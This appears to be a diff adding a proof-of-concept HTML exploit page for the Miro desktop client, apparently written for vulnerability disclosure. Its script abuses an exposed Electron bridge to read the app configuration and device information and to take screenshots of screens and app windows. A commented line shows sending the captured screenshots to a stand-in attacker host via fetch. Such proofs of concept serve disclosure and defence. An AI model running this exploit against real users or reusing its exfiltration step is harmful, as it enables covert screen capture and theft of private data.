@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Miro Desktop Deep Link PoC</title>
+<style>
+body { font-family: monospace; background: #1a1a2e; color: #0f0; padding: 20px; }
+h1 { color: #e94560; }
+.section { margin: 15px 0; padding: 10px; border: 1px solid #333; background: #16213e; }
+.label { color: #e94560; font-weight: bold; }
+.success { color: #0f0; }
+.fail { color: #f00; }
+.thumb { max-width: 400px; border: 2px solid #e94560; margin: 5px; }
+#log { white-space: pre-wrap; font-size: 12px; }
+</style>
+</head>
+<body>
+<h1>Miro Desktop — Deep Link to Arbitrary Domain PoC</h1>
+<p>If you see this page inside the Miro desktop client, the open redirect chain worked.</p>
+
+<div class="section">
+<span class="label">1. Bridge Detection</span>
+<div id="bridge-check"></div>
+</div>
+
+<div class="section">
+<span class="label">2. getAppConfig()</span>
+<div id="app-config"></div>
+</div>
+
+<div class="section">
+<span class="label">3. getDeviceInfo()</span>
+<div id="device-info"></div>
+</div>
+
+<div class="section">
+<span class="label">4. Screen Capture (getScreenSharingSources)</span>
+<div id="screen-capture"></div>
+<div id="thumbnails"></div>
+</div>
+
+<div class="section">
+<span class="label">Log</span>
+<div id="log"></div>
+</div>
+
+<script>
+function log(msg) {
+    document.getElementById('log').textContent += new Date().toISOString().slice(11,19) + ' ' + msg + '\n';
+}
+
+function esc(s) {
+    return String(s).replace(/</g, '&lt;').replace(/>/g, '&gt;');
+}
+
+(async function() {
+    // 1. Check bridge availability
+    const bridgeEl = document.getElementById('bridge-check');
+    if (typeof _rtb_app_actions_ !== 'undefined') {
+        bridgeEl.innerHTML = '<span class="success">_rtb_app_actions_ bridge ACCESSIBLE</span>';
+        log('Bridge found: ' + Object.keys(_rtb_app_actions_).join(', '));
+    } else {
+        bridgeEl.innerHTML = '<span class="fail">_rtb_app_actions_ NOT found (not in Electron webview)</span>';
+        log('Bridge not found — page is not running inside Miro desktop webview');
+        return;
+    }
+
+    // Also check _rtb_app_features_
+    if (typeof _rtb_app_features_ !== 'undefined') {
+        log('Features: ' + JSON.stringify(_rtb_app_features_));
+    }
+
+    // 2. getAppConfig
+    try {
+        const config = _rtb_app_actions_.getAppConfig();
+        document.getElementById('app-config').innerHTML =
+            '<span class="success">Config retrieved:</span><br>' + esc(JSON.stringify(config, null, 2));
+        log('getAppConfig: ' + JSON.stringify(config));
+    } catch(e) {
+        document.getElementById('app-config').innerHTML = '<span class="fail">Error: ' + esc(e.message) + '</span>';
+        log('getAppConfig error: ' + e.message);
+    }
+
+    // 3. getDeviceInfo
+    try {
+        const info = _rtb_app_actions_.getDeviceInfo();
+        document.getElementById('device-info').innerHTML =
+            '<span class="success">Device info retrieved:</span><br>' + esc(JSON.stringify(info, null, 2));
+        log('getDeviceInfo: ' + JSON.stringify(info));
+    } catch(e) {
+        document.getElementById('device-info').innerHTML = '<span class="fail">Error: ' + esc(e.message) + '</span>';
+        log('getDeviceInfo error: ' + e.message);
+    }
+
+    // 4. Screen capture — the high-impact one
+    try {
+        const sources = await _rtb_app_actions_.getScreenSharingSources({
+            includeScreens: true,
+            includeAppWindows: true,
+            thumbnailWidth: 800,
+            thumbnailHeight: 600
+        });
+
+        const captureEl = document.getElementById('screen-capture');
+        const thumbEl = document.getElementById('thumbnails');
+
+        captureEl.innerHTML = '<span class="success">Screen sources captured: ' + sources.length + ' sources</span>';
+        log('getScreenSharingSources returned ' + sources.length + ' sources');
+
+        sources.forEach((src, i) => {
+            log('Source ' + i + ': id=' + src.id + ' name=' + src.name + ' displayId=' + src.displayId);
+
+            // Display the thumbnail (this IS the screenshot)
+            if (src.thumbnailUrl) {
+                const img = document.createElement('img');
+                img.src = src.thumbnailUrl;
+                img.className = 'thumb';
+                img.title = src.name + ' (' + src.id + ')';
+                thumbEl.appendChild(img);
+
+                const label = document.createElement('div');
+                label.textContent = 'Source: ' + src.name + ' (' + src.screenWidth + 'x' + src.screenHeight + ')';
+                label.style.color = '#e94560';
+                thumbEl.appendChild(label);
+            }
+        });
+
+        // PoC note: In a real attack, sources would be exfiltrated:
+        // fetch('https://attacker.example.com/exfil', {method:'POST', body:JSON.stringify(sources)});
+
+    } catch(e) {
+        document.getElementById('screen-capture').innerHTML = '<span class="fail">Error: ' + esc(e.message) + '</span>';
+        log('getScreenSharingSources error: ' + e.message);
+    }
+})();
+</script>
+</body>
+</html>
